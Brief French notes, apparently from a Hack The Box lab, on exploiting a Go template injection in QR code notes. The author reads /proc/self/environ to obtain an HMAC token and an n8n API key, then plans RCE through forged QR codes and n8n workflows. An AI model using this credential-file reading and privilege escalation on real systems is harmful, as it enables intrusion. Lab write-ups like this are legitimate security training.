ok on a une SSTI en go dans les notes du qr code, qui nous permet de récupérer le /proc/self/environ avec les variables d'environnement dedans. 

LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin USER=www-data LOGNAME=ww
w-data HOME=/var/www INVOCATION_ID=ee125e9226ec48d1af0cfbbcfaa6756f JOURNAL_STREAM=9:14
173 SYSTEMD_EXEC_PID=1751 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/htb-air.servi
ce/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA= TICKET_VA
LIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR
N8N_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOW
ZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MD
QtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944
ioBnth2fupQtsimazdzLzAOo

dedans y'a le token de validation HMAC pour le qr code, ce qui va nous permettre d'en forge un qui va lead a une RCE 

une fois en tant que www-data, on peut set la variable N8N : 

N8N_API_KEY='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo'

on voit le service n8n qui tourne sur 127.0.0.1
on va tester de créer un workflow, d'y accéder, pour voir si ça peut lead a une RCE 